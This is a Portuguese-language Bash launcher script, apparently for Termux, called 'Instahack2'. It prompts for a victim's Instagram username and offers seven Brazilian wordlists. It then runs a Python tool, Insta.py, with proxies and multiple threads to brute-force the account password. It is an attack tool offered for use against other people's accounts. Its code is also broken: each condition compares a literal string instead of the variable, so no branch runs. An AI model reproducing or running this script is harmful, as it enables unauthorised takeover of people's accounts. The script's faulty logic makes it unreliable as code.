#!/usr/bin/bash/
#
#
sh settings
apt install python3
apt install python
apt install python2
cd Instagram
clear
figlet Instahack2
#
#MENU
echo
echo "========================================================="
echo "= \033[1;36m[\033[1;36m1]>> \033[1;33mInvadir uma conta"
echo "= \033[1;36m[\033[1;36m2]>> \033[1;33mSair"
echo "========================================================="
echo
read -p "[+]=>" instahack
#
clear
figlet Instahack2
echo "\033[1;32m\n\n[+]=>DIGITE OU COLE O NOME DA VÍTIMA exe:(pedro1234)"
#
read -p "[+]=>" vitima
echo
echo "\033[1;32m\n\n[+]=>ESCOLHA UMA DAS WORDLISTS:"
echo
	echo "\033[1;36m[\033[1;36m1]>> \033[1;33mbiblic-words-pt-br.txt"
	echo "\033[1;36m[\033[1;36m2]>> \033[1;33mdic-ptbr-utf8-2.txt"
	echo "\033[1;36m[\033[1;36m3]>> \033[1;33mbrazilian-soccer-teams.txt"
	echo "\033[1;36m[\033[1;36m4]>> \033[1;33mdic-ptbr-utf8.txt"
	echo "\033[1;36m[\033[1;36m5]>> \033[1;33mfirst-name-pt-br.txt"
	echo "\033[1;36m[\033[1;36m6]>> \033[1;33mumbanda_candomble_terms_small.txt"
	echo "\033[1;36m[\033[1;36m7]>> \033[1;33m0xc0da-ptbr.txt"
echo
read -p "[+]=>" wordlist
#
#
if [ "wordlist" = "1" ]; then
#
cd Insta-hack
python Insta.py -u $vitima -w /data/data/com.termux/files/home/instahackv2/wordlists/biblic-words-pt-br.txt -p prox.txt -t 4 -d -v
fi
if [ "wordlist" = "2" ]; then
cd Insta-hack
python Insta.py -u $vitima -w /data/data/com.termux/files/home/instahackv2/wordlists/dic-ptbr-utf8-2 -p prox.txt -t 4 -d -v
fi
if [ "wordlist" = "3" ]; then
cd Insta-hack
python Insta.py -u $vitima -w /data/data/com.termux/files/home/instahackv2/wordlists/brazilian-soccer-teams.txt -p prox.txt -t 4 -d -v
fi
if [ "wordlist" = "4" ]; then
cd Insta-hack
python Insta.py -u $vitima -w /data/data/com.termux/files/home/instahackv2/wordlists/dic-ptbr-utf8.txt -p prox.txt -t 4 -d -v
fi
if [ "wordlist" = "5" ]; then
cd Insta-hack
python Insta.py -u $vitima -w /data/data/com.termux/files/home/instahackv2/wordlists/first-name-pt-br.txt -p prox.txt -t 4 -d -v
fi
if [ "wordlist" = "6" ]; then
cd Insta-hack
python Insta.py -u $vitima -w /data/data/com.termux/files/home/instahackv2/wordlists/umbanda_candomble_terms_small.txt -p prox.txt -t 4 -d -v
fi
if [ "wordlist" = "7" ]; then
cd Insta-hack
python Insta.py -u $vitima -w /data/data/com.termux/files/home/instahackv2/wordlists/0xc0da-ptbr.txt -p prox.txt -t 4 -d -v
fi
exit
